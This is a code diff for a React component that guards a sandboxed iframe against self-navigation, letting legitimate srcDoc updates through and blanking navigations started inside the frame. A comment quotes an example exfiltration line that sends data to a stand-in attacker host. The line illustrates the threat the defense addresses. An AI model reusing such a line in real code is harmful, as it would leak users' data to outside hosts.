@@ -14,17 +14,23 @@ const SandboxedFrame: FC<{ srcDoc: string; title: string }> = memo(({ srcDoc, ti
   // A sandboxed srcdoc frame can still exfiltrate by navigating ITSELF
   // (location.href = 'https://attacker/?data'), which connect-src doesn't
   // cover. The CSP adds `navigate-to 'none'`; this onLoad guard is defense in
-  // depth — if the frame ever loads something other than its initial srcdoc
-  // document, blank it. (allow-top-navigation is already withheld.)
-  const initialLoad = useRef(true);
-  const handleLoad = useCallback((e: React.SyntheticEvent<HTMLIFrameElement>) => {
-    if (initialLoad.current) {
-      initialLoad.current = false;
-      return;
-    }
-    // Any subsequent load = navigation attempt. Reset to a blank sandboxed doc.
-    e.currentTarget.srcdoc = '<!doctype html><meta charset="utf-8"><title>blocked</title>';
-  }, []);
+  // depth — if the frame navigates AWAY from the srcDoc we intentionally set,
+  // blank it. We track the srcDoc we last committed so a legitimate
+  // artifact/version update (which changes `srcDoc` and triggers a load) is
+  // allowed, while an in-frame `location =` navigation (which does NOT change
+  // our prop) is treated as hostile.
+  const committedSrcDoc = useRef<string | null>(null);
+  const handleLoad = useCallback(
+    (e: React.SyntheticEvent<HTMLIFrameElement>) => {
+      if (committedSrcDoc.current === srcDoc) {
+        // Load fired without our srcDoc changing → self-navigation. Block it.
+        e.currentTarget.srcdoc = '<!doctype html><meta charset="utf-8"><title>blocked</title>';
+        return;
+      }
+      committedSrcDoc.current = srcDoc;
+    },
+    [srcDoc],
+  );
   return (
     <iframe
       title={title}
